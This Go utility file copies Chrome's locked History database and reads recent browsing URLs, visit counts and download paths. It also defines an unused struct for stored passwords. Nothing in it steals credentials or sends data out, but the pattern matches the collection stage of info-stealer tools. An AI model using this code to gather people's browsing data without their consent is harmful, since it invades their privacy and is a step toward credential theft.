package utils

import (
	"database/sql"
	"fmt"
	"io"
	"os"
	"path/filepath"

	_ "github.com/mattn/go-sqlite3"
)

type BrowserData struct {
	URLs      []string
	Passwords []PasswordEntry
	Downloads []string
}

type PasswordEntry struct {
	URL      string
	Username string
	Password string
}

func GetBrowserData() (*BrowserData, error) {
	chromePath := filepath.Join(os.Getenv("LOCALAPPDATA"),
		"Google\\Chrome\\User Data\\Default")

	data := &BrowserData{
		URLs:      make([]string, 0),
		Passwords: make([]PasswordEntry, 0),
		Downloads: make([]string, 0),
	}

	historyDB := filepath.Join(chromePath, "History")
	if historyData, err := readHistory(historyDB); err == nil {
		data.URLs = historyData
	}

	if downloads, err := readDownloads(historyDB); err == nil {
		data.Downloads = downloads
	}

	return data, nil
}

func readHistory(dbPath string) ([]string, error) {

	tmpDB := dbPath + ".tmp"
	if err := copyFile(dbPath, tmpDB); err != nil {
		return nil, err
	}
	defer os.Remove(tmpDB)

	db, err := sql.Open("sqlite3", tmpDB)
	if err != nil {
		return nil, err
	}
	defer db.Close()

	rows, err := db.Query(`
        SELECT url, title, visit_count 
        FROM urls 
        ORDER BY last_visit_time DESC 
        LIMIT 100
    `)
	if err != nil {
		return nil, fmt.Errorf("error al consultar la base de datos: %w", err)
	}
	defer rows.Close()

	var urls []string
	for rows.Next() {
		var url, title string
		var count int
		if err := rows.Scan(&url, &title, &count); err != nil {
			fmt.Printf("Error escaneando fila: %v\n", err)
			continue
		}
		urls = append(urls, fmt.Sprintf("%s (%d visitas)", url, count))
	}

	return urls, nil
}

func readDownloads(dbPath string) ([]string, error) {
	tmpDB := dbPath + ".tmp"
	if err := copyFile(dbPath, tmpDB); err != nil {
		return nil, err
	}
	defer os.Remove(tmpDB)

	db, err := sql.Open("sqlite3", tmpDB)
	if err != nil {
		return nil, err
	}
	defer db.Close()

	rows, err := db.Query(`
        SELECT target_path, received_bytes 
        FROM downloads 
        ORDER BY start_time DESC 
        LIMIT 50
    `)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var downloads []string
	for rows.Next() {
		var path string
		var bytes int64
		rows.Scan(&path, &bytes)
		downloads = append(downloads, fmt.Sprintf("%s (%d bytes)", path, bytes))
	}

	return downloads, nil
}

func copyFile(src, dst string) error {
	sourceFile, err := os.Open(src)
	if err != nil {
		return err
	}
	defer sourceFile.Close()

	destFile, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer destFile.Close()

	_, err = io.Copy(destFile, sourceFile)
	return err
}
